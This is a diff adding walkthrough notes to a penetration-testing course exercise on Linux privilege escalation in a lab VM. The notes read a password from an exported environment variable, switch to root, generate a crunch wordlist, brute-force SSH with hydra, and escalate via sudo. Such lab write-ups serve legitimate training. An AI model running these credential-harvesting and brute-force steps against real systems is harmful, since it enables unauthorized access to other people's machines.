@@ -1,5 +1,58 @@
 Questions 1
 Connect to the VM 1 and repeat the steps learned in this section. Which command is used to list sudoer capabilities for a given user?
 
+ssh joe@192.168.214.214
+# Lets view its env 
+...
+SHELL=/bin/bash
+PWD=/home/joe
+LOGNAME=joe
+XDG_SESSION_TYPE=tty
+HOME=/home/joe
+...
+SCRIPT_CREDENTIALS=lab
+USER=joe
+...
+
+# SCRIPT_CREDENTIALS variable holds a value that resembles a password. To confirm that we are dealing with a permanent variable, we need to inspect the .bashrc configuration file.
+
+cat .bashrc
+...
+export SCRIPT_CREDENTIALS="lab"
+...
+# From the above listing, we can confirm that the variable holding the password is exported when a user's shell is launched.
+
+# Change to the root user 
+su - root
+Password: lab
+
+# Successfully obtaining root privileges
+
+# There is another methods of privilege escalation route instead based on environment variable credentials findings which is brute force
+
+# Prepare the wordlist 
+crunch 6 6 -t Lab%%% > wordlist
+
+# Since an SSH server is available on our target machine, we can try to attempt a remote brute force attack via Hydra. We'll supply the target username with the -l parameter, our wordlist with -P, the target IP address, and finally ssh as the target protocol. We will also include -V to increase verbosity.
+
+hydra -l eve -P wordlist 192.168.214.214 -t 4 ssh -V        
+...
+[22][ssh] host: 192.168.214.214   login: eve   password: Lab123
+...
+
+# Hydra brute forcing succeeded and now we can try the login 
+ssh eve@192.168.214.214
+Pasword: lab123
+
+# We can verify if we're running as a privileged users by listing the sudo capabilities using sudo -l command
+sudo -l 
+
+# Eve seems to be an administrative account, we can elevcate directly to the root user running i with sudo
+sudo -i
+
+Whoami
+root
+
+
 
 
